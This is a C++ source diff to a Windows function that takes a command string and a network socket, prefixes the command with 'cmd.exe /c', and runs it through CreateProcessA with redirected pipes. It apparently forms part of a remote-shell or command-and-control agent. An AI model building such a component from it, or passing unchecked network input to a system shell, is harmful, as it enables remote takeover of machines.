@@ -176,15 +176,22 @@ int execute_command(const char* cmd, SOCKET ConnectSocket)
 	if (!SetHandleInformation(g_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0))
 		return 1;
 
-	/*const char fCmd[32 + strlen(cmd)];
-	fCmd[0] = "C:\\Windows\\System32\\cmd.exe /k ";
-	TCHAR cmdLine[1024];
-	wcsncat_s(cmdLine, TEXT("C:\\Windows\\System32\\cmd.exe /k "), 1024);
-	wchar_t wCmd[996];
-	mbstowcs_s(NULL, wCmd, cmd, strlen(cmd) + 1);
-	wcsncat_s(cmdLine, wCmd, 1024);*/
-	printf("Running command: whoami\n");
-	TCHAR cmdLine[] = TEXT("C:\\Windows\\System32\\cmd.exe /c whoami");
+	size_t cmdBufLen = 32 + strlen(cmd);
+	std::string fCmd = "C:\\Windows\\System32\\cmd.exe /c ";
+	fCmd.append(cmd);
+	LPSTR aCmd = const_cast<char*>(fCmd.c_str());
+	//fCmd = ;
+	//strcpy(fCmd, "C:\\Windows\\System32\\cmd.exe /k ");
+	//strcpy(&fCmd[32], cmd);
+	//TCHAR* cmdLine = (TCHAR*)malloc(cmdBufLen * sizeof(TCHAR));
+	/*int nChars = MultiByteToWideChar(CP_ACP, 0, fCmd, -1, NULL, 0);
+	wchar_t* wCmd = new WCHAR[nChars];
+	MultiByteToWideChar(CP_ACP, 0, fCmd, -1, (LPWSTR)wCmd, nChars);*/
+	/*std::wstring wFCmd = std::wstring(fCmd.begin(), fCmd.end());
+	const wchar_t* wCmd = wFCmd.c_str();*/
+	//printf("Precopy command: ")
+	//printf("Running command: %s\n", fCmd.c_str());
+	//TCHAR cmdLine[] = TEXT("C:\\Windows\\System32\\cmd.exe /c whoami");
 	PROCESS_INFORMATION pi;
 	STARTUPINFO si;
 	BOOL bSuccess = FALSE;
@@ -198,16 +205,16 @@ int execute_command(const char* cmd, SOCKET ConnectSocket)
 	si.hStdInput = g_hChildStd_IN_Rd;
 	si.dwFlags |= STARTF_USESTDHANDLES;
 
-	bSuccess = CreateProcess(
+	bSuccess = CreateProcessA(
 		NULL,
-		cmdLine,
+		aCmd,
 		NULL,
 		NULL,
 		TRUE,
 		0,
 		NULL,
 		NULL,
-		&si,
+		(LPSTARTUPINFOA)&si,
 		&pi
 	);
 
